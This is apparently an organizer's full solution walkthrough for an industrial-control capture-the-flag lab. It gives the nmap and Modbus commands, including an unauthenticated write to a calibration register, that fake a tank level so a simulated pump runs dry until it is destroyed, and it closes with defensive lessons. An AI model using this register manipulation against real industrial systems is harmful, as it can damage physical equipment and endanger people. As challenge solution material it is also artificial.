# The Last Bottle — official walkthrough

> **Spoiler warning:** This document contains the complete solution, register
> map, damaging write and flag evidence. Do not provide it to players during a
> live event. All commands apply only to the isolated challenge network.

## Result

The challenge is an integrity and availability failure in an industrial
control process. A player on the supplied maintenance workstation can issue an
unauthenticated Modbus/TCP write to RIO-101's level-transmitter calibration
register. PLC-101 trusts the resulting false-high measurement, makes unsafe
control decisions, and eventually dry-runs transfer pump P-101 until the
independent physical model marks it permanently broken.

The essential vulnerability is:

> A reachable Modbus/TCP server accepts an unauthorized write to a
> safety-relevant calibration register, and the PLC trusts the manipulated
> measurement without an independent physical protection layer.

This is not an HMI or web exploit. It is abuse of an unauthenticated industrial
communications protocol and an unsafe process trust relationship.

## ICS primer

The lab separates the major roles found in a small industrial environment:

| Component | Meaning in this lab |
|---|---|
| Physical process | The simulated tank, inlet, liquid, pump, temperature, vibration and damage |
| RIO / Remote I/O | Interfaces with the tank-level sensor and publishes its value over Modbus |
| PLC | Repeatedly reads sensor data and decides when the inlet and pump should run |
| HMI | The operator's graphical screen for values, alarms and commands |
| SCADA | The wider supervisory layer containing the HMI, telemetry and alarms |
| Modbus/TCP | The register-based protocol used by the controller and field device, normally on TCP/502 |

The HMI is not the controller. PLC-101 continues executing its scan cycle even
when nobody has the HMI open. The player can therefore communicate directly
with the PLCs and RIO using Modbus.

Modbus register references use conventional ranges in this lab:

- `3xxxx` input registers hold read-only measurements and status;
- `4xxxx` holding registers hold readable and potentially writable parameters;
- `30001` and `40001` both correspond to zero-based protocol offset `0`, but
  they belong to different register tables.

## 1. Enter the maintenance workstation

Connect using the challenge host supplied by the organizer:

```sh
ssh player@CHALLENGE_HOST -p 2224
```

The banner defines the target, allowed control-network range and installed
tools.

![Player briefing shown after SSH login](assets/screenshots/01-player-brief.png)

## 2. Discover the control-network assets

Start with host discovery. This is much faster than immediately running a
full-port scan against all 256 addresses:

```sh
nmap -sn -n 172.30.10.0/24
```

![Live-host discovery](assets/screenshots/02-network-discovery.png)

The responsive addresses are `.1`, `.11`, `.12`, `.13`, `.20` and `.50`.
`.1` is the Docker-network gateway and `.50` is the supplied workstation. Scan
the candidate industrial hosts:

```sh
nmap -sT -Pn -n -p- --open --min-rate 3000 --max-retries 1 \
  172.30.10.11-13 172.30.10.20
```

![Targeted service discovery](assets/screenshots/06-live-host-and-service-discovery.png)

The scan finds Modbus/TCP on `.11`, `.12` and `.13`, plus the internal HMI on
`.20:8080`. Port 502 is internal to the lab and is not exposed by the VPS.

### Why the first `/24` port scan was slow

A full TCP scan sends probes for 65,535 ports to every address. Most unused
addresses silently drop those probes, making Nmap wait for retries and
round-trip-time estimates:

![Unnecessarily broad full-port scan and RTT warnings](assets/screenshots/05-full-subnet-scan-timeout.png)

The two-stage host-discovery and targeted-scan method avoids that delay.

## 3. Identify the Modbus devices

Query the standard Modbus device-identification objects:

```sh
mbcli identify 172.30.10.11
mbcli identify 172.30.10.12
mbcli identify 172.30.10.13
```

![Modbus device identities](assets/screenshots/07-modbus-device-identification.png)

The identities provide the key distinction:

```text
172.30.10.11  PLC101 — Tank and Transfer Pump Controller
172.30.10.12  PLC102 — Bottle Conveyor Controller
172.30.10.13  RIO101 — LT-101 Remote I/O Gateway / Tank Level
```

PLC-102 controls an unrelated conveyor. PLC-101 is the controller whose pump
must fail, but RIO-101 is the source of the contradictory tank-level value.
That makes `.13` the logical place to investigate sensor-data manipulation.

In short, `.11` is the controller affected by the attack; `.13` is the
vulnerable source of the data that drives its decision.

## 4. Observe live RIO telemetry

Read two input registers starting at reference 30001:

```sh
mbcli read-input 172.30.10.13 30001 2
```

![Initial RIO input-register read](assets/screenshots/08-rio-input-registers.png)

Repeated reads show that `30001` changes with the physical tank level, while
`30002` remains `1`:

![Changing tank-level telemetry with good sensor quality](assets/screenshots/09-dynamic-level-telemetry.png)

Therefore:

- `30001` is the reported level, scaled by `0.01%`;
- `30002` is the communication-quality value, where `1` means good.

## 5. Find the writable boundary

Field transmitters commonly expose measurements as input registers and
maintenance or calibration parameters as holding registers. Test the first
holding-register reference and the next address:

```sh
mbcli read-holding 172.30.10.13 40001 1
mbcli read-holding 172.30.10.13 40002 1
```

![Only RIO holding register 40001 exists](assets/screenshots/10-rio-holding-register-boundary.png)

Register `40001` exists and begins at zero. Register `40002` returns an
illegal-address failure. The deliberately bounded map lets the player identify
one candidate parameter without blindly corrupting a large address range.

## 6. Prove the calibration relationship safely

Apply a small positive value:

```sh
mbcli write 172.30.10.13 40001 500
mbcli read-input 172.30.10.13 30001 2
mbcli read-holding 172.30.10.13 40001 1
```

![Small calibration write and changed reported level](assets/screenshots/11-small-calibration-write.png)

The holding register now contains `500`, representing a `+5.00%` bias, and the
reported level increases accordingly. Normal inlet and pump activity can move
the underlying physical level during this comparison.

Restore the original value before the final test:

```sh
mbcli write 172.30.10.13 40001 0
```

![Calibration restored to zero](assets/screenshots/12-calibration-restored.png)

This reversible test establishes the register's meaning and provides a useful
negative control: restoring the value removes the injected bias.

## 7. Inject the false-high measurement

Write a `+100.00%` calibration bias:

```sh
mbcli write 172.30.10.13 40001 10000
```

![Final false-high calibration write](assets/screenshots/13-final-false-level-write.png)

The request succeeds without credentials, a client certificate, a source-host
allowlist or any application authorization. This is a Modbus function-code 06
write to a single holding register.

## 8. Verify the cyber-physical consequence

Read the ten PLC-101 telemetry registers periodically:

```sh
for i in $(seq 1 30); do
  date -u +%H:%M:%S
  mbcli read-input 172.30.10.11 30001 10
  sleep 3
done
```

This portable loop is used instead of `watch`, which may reject the player's
`xterm-kitty` terminal type.

The false-high level causes PLC-101 to close the inlet while continuing the
transfer sequence. The physical tank eventually empties, the pump dry-runs,
and the independent model accumulates terminal damage.

![PLC telemetry after terminal pump failure](assets/screenshots/14-terminal-machine-failure.png)

The final values are:

| Reference | Raw value | Interpretation |
|---:|---:|---|
| 30001 | 10000 | controller-reported level = 100.00% |
| 30006 | 149 | latched dry-run duration = 14.9 seconds |
| 30007 | 10000 | pump damage = 100.00% |
| 30009 | 1 | dry-run alarm active |
| 30010 | 3 | machine state = BROKEN |

## 9. Claim the proof token

Use the supplied checker endpoint. From the lab workstation, the explicitly
provided checker is also reachable on its edge-network address:

```sh
curl http://172.30.30.30:8080/api/claim
```

For a normal player handout, use the public endpoint instead:

```sh
curl http://CHALLENGE_HOST:8090/api/claim
```

![Checker response confirming solved state and returning an instance flag](assets/screenshots/15-flag-claimed.png)

The response reports `solved: true`, `machine_state: BROKEN`, damage of 100%,
and an instance-specific `flag{...}` token.

## Complete causal chain

```text
Player reaches RIO-101 over the control VLAN
        ↓
Unauthenticated Modbus FC06 write changes 40001
        ↓
RIO reports actual level + malicious calibration bias
        ↓
PLC-101 trusts the false-high LT-101 measurement
        ↓
Inlet closes while transfer operation continues
        ↓
The independent physical tank empties
        ↓
P-101 dry-runs, overheats and reaches 100% simulated damage
        ↓
The independent checker releases the proof token
```

Changing a displayed value alone is insufficient. The checker reads the
authoritative plant model, not the PLC or HMI register image, and releases the
flag only after sustained dry running causes terminal physical state.

## Vulnerability classification

The solve combines several weaknesses:

1. the player workstation can reach safety-relevant field I/O;
2. classic Modbus/TCP provides no client authentication or message integrity;
3. RIO-101 accepts writes from any reachable Modbus client;
4. a safety-relevant calibration register has no effective range restriction;
5. PLC-101 relies on one network-derived level measurement;
6. no independent hardwired low-level trip prevents pump damage.

The scenario is threat-informed by FrostyGoop, whose documented behavior
included interacting with industrial devices over Modbus/TCP and reading or
writing holding registers to manipulate operation. This lab is an original,
fictional process and does not reproduce the malware or a victim product.

Relevant ATT&CK for ICS techniques include:

- [T0801 — Monitor Process State](https://attack.mitre.org/techniques/T0801/)
- [T0836 — Modify Parameter](https://attack.mitre.org/techniques/T0836/)
- [T0869 — Standard Application Layer Protocol](https://attack.mitre.org/techniques/T0869/)
- [T1692.001 — Unauthorized Message: Command Message](https://attack.mitre.org/techniques/T1692/001/)
- [T0832 — Manipulation of View](https://attack.mitre.org/techniques/T0832/)
- [T0879 — Damage to Property](https://attack.mitre.org/techniques/T0879/), simulated only

References:

- [MITRE ATT&CK S1165 — FrostyGoop](https://attack.mitre.org/software/S1165/)
- [Dragos — Protect Against FrostyGoop ICS Malware](https://www.dragos.com/blog/protect-against-frostygoop-ics-malware-targeting-operational-technology)
- [Modbus Organization — Modbus Security](https://www.modbus.org/news/modbus-security-new-protocol-to-improve-control-system-security)

## Defensive lessons

- Segment PLCs and field I/O by function and allow only required peers.
- Restrict Modbus write function codes and register ranges at an industrial
  firewall or protocol-aware gateway.
- Authenticate endpoints and protect message integrity with Modbus Security or
  an authenticated tunnel where device support permits it.
- Alert on writes to calibration, setpoint and safety-relevant parameters.
- Apply engineering range checks and change-control requirements to calibration
  values.
- Use an independent sensor or hardwired low-level trip for a damaging pump
  failure mode.
- Compare controller telemetry with independent physical invariants.

## Evidence index

All captured images are retained in sequence under
[`assets/screenshots`](assets/screenshots/):

| # | Evidence |
|---:|---|
| 01 | [Player SSH brief](assets/screenshots/01-player-brief.png) |
| 02 | [Initial network discovery](assets/screenshots/02-network-discovery.png) |
| 03 | [Focused PLC-101 port scan](assets/screenshots/03-plc101-port-scan.png) |
| 04 | [PLC-101 device identity](assets/screenshots/04-plc101-identification.png) |
| 05 | [Slow full-subnet scan behavior](assets/screenshots/05-full-subnet-scan-timeout.png) |
| 06 | [Efficient host and service discovery](assets/screenshots/06-live-host-and-service-discovery.png) |
| 07 | [All Modbus device identities](assets/screenshots/07-modbus-device-identification.png) |
| 08 | [Initial RIO input-register values](assets/screenshots/08-rio-input-registers.png) |
| 09 | [Dynamic level telemetry](assets/screenshots/09-dynamic-level-telemetry.png) |
| 10 | [Bounded RIO holding-register map](assets/screenshots/10-rio-holding-register-boundary.png) |
| 11 | [Small reversible calibration test](assets/screenshots/11-small-calibration-write.png) |
| 12 | [Calibration restored](assets/screenshots/12-calibration-restored.png) |
| 13 | [Final false-high write](assets/screenshots/13-final-false-level-write.png) |
| 14 | [Terminal physical failure](assets/screenshots/14-terminal-machine-failure.png) |
| 15 | [Checker validation and flag](assets/screenshots/15-flag-claimed.png) |
